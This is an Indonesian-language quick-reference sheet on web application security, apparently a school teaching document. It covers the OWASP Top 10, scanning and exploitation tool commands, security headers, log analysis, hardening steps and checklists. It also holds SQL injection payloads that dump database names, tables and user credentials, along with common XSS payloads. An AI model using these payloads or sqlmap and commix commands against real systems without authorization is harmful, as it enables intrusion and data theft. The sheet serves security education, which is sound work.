# 🔍 Referensi Cepat - Keamanan Aplikasi Web

## 🛡️ OWASP Top 10 2021
1. **Broken Access Control**
   - URL manipulation
   - Insecure direct object references
   - Missing function level access control

2. **Cryptographic Failures**
   - Weak hashing algorithms
   - Improper certificate validation
   - Hardcoded secrets

3. **Injection**
   - SQL, NoSQL, OS, LDAP injection
   - Template injection
   - Expression language injection

4. **Insecure Design**
   - Missing security controls
   - Insecure patterns
   - Lack of threat modeling

5. **Security Misconfiguration**
   - Default credentials
   - Verbose error messages
   - Unnecessary features enabled

## 🛠️ Tools Penting

### 1. Scanning & Testing
```bash
# OWASP ZAP
zap.sh -daemon -port 8080 -host 127.0.0.1 -config api.disablekey=true

# Nmap (Network Scanning)
nmap -sV --script vuln target.com

# Nikto (Web Server Scanner)
nikto -h target.com
```

### 2. Exploitation
```bash
# SQLmap (SQL Injection)
sqlmap -u "http://target.com/page?id=1" --dbs

# XSStrike (XSS Scanner)
python3 xsstrike.py -u "http://target.com/search?q=test"

# Commix (Command Injection)
python3 commix.py -u "http://target.com/cmd.php?cmd=id"
```

### 3. Proxy & Interception
```bash
# Burp Suite
java -jar burpsuite_community.jar

# mitmproxy
mitmproxy -p 8080
```

## 🔐 Header Keamanan HTTP
```http
# Mencegah clickjacking
X-Frame-Options: DENY

# Mencegah MIME-sniffing
X-Content-Type-Options: nosniff

# Mengaktifkan XSS filter browser
X-XSS-Protection: 1; mode=block

# Kebijakan keamanan konten
Content-Security-Policy: default-src 'self'

# Kebijakan transportasi HTTP yang aman
Strict-Transport-Security: max-age=31536000; includeSubDomains

# Kontrol referrer
Referrer-Policy: no-referrer

# Kebijakan fitur
Feature-Policy: geolocation 'none'; microphone 'none'
```

## 🧰 Perintah SQL Injection

### Deteksi
```sql
' OR '1'='1
' OR 1=1 --
' UNION SELECT null,username,password FROM users--
```

### Eksploitasi
```sql
-- Daftar database
' UNION SELECT schema_name,null FROM information_schema.schemata--

-- Daftar tabel
' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema='database'--

-- Daftar kolom
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--

-- Ambil data
' UNION SELECT username,password FROM users--
```

## 🎯 Payload XSS Umum
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

## 📌 Perintah Linux untuk Keamanan

### Analisis Log
```bash
# Monitor akses web secara real-time
tail -f /var/log/nginx/access.log

# Cari upaya login gagan
grep "Failed password" /var/log/auth.log

# Hitung IP yang melakukan banyak request
awk '{print $1}' access.log | sort | uniq -c | sort -nr | head -n 10
```

### Hardening
```bash
# Nonaktifkan login root
sudo passwd -l root

# Periksa file dengan SUID
find / -perm -4000 -type f 2>/dev/null

# Periksa port yang terbuka
ss -tulnp
```

## 📚 Referensi Penting

### Dokumentasi
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [Mozilla Security Guidelines](https://infosec.mozilla.org/guidelines/web_security)

### Tools
- [OWASP ZAP](https://www.zaproxy.org/)
- [Burp Suite](https://portswigger.net/burp)
- [Nmap](https://nmap.org/)
- [Wireshark](https://www.wireshark.org/)

### Sumber Belajar
- [Hack The Box](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [Hacker101](https://www.hacker101.com/)

## 📋 Checklist Keamanan Dasar

### Aplikasi Web
- [ ] Validasi input di server dan client
- [ ] Gunakan parameterized queries
- [ ] Implementasikan autentikasi yang aman
- [ ] Terapkan kontrol akses yang tepat
- [ ] Lindungi data sensitif
- [ ] Konfigurasi keamanan yang tepat
- [ ] Lakukan hardening server
- [ ] Enkripsi data dalam perjalanan (TLS)
- [ ] Perbarui dependensi secara berkala
- [ ] Lakukan pengujian keamanan rutin

### API
- [ ] Gunakan autentikasi yang kuat
- [ ] Terapkan rate limiting
- [ ] Validasi input dan output
- [ ] Gunakan HTTPS
- [ ] Terapkan CORS dengan benar
- [ ] Log aktivitas penting

---
<div align="center">
  <p>Dokumen Referensi - Keamanan Aplikasi Web</p>
  <p>© 2025 SMKN 1 Punggelan</p>
</div>
